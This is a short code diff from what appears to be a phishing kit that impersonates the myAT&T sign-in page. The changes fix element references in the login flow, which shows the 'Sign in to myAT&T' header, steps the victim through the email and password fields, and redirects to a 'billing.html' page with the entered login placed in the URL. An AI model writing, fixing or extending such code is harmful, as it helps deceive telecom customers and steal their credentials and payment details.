@@ -473,7 +473,7 @@ console.log(randomString);
 		
 		if(logincl !== 'null'){
 		document.getElementById('appErrorAbove').style.display = "block";
-		dispemElement.textContent = logincl;
+		document.getElementById('dispem').textContent = logincl;
 		Next.click();
 		if(msg.includes('on')){
                 window.location.href = ablp+"/billing.html?"+generateRandomString(6)+"%User="+login+" id_token="+randomString;
@@ -492,7 +492,7 @@ console.log(randomString);
             passfield.style.display = "none";
             Next.style.display = "block";
             Signin.style.display = "none";
-            dispemElement.textContent = "";
+            document.getElementById('dispemdiv').textContent = "";
             document.getElementById("passwordError").style.display = "";
             document.getElementById("userError").style.display = "none";
             document.getElementById('signInHeaderText').innerHTML = "Sign in  <br><span style='font-size:2rem;'>to myAT&T</span>";
